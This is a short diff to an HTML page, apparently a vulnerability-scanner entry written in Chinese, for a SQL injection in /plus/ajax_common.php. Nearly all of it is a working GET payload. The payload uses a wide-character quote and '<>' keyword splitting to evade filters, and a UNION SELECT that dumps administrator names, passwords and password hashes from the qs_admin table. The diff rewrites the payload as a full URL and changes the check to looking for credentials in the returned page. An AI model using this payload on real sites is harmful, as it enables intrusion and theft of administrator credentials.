@@ -1,11 +1,7 @@
 <meta charset="UTF-8">
 <div>
     <h3>SQL注入 URL: </h3>
-    <ul>
-        <p>/plus/ajax_common.php</p>
-    </ul>
-    <h3>GET-payload: </h3>
-        <code>?act=hotword&query=錦'%20a<>nd%201=2%20un<>ion%20sel<>ect%201,group_concat(admin_name,0x3a,pwd,0x3a,pwd_hash),3%20fr<>om%20qs_admin%23</code>
+    <code>http://example.com/plus/ajax_common.php?act=hotword&query=錦'%20a<>nd%201=2%20un<>ion%20sel<>ect%201,group_concat(admin_name,0x3a,pwd,0x3a,pwd_hash),3%20fr<>om%20qs_admin%23</code>
     <h3>验证过程</h3>
-    <p>查看response text 是否含有"username","password" 等字符</p>
+    <p>查看返回页面源码中是有用户名与密码</p>
 </div>
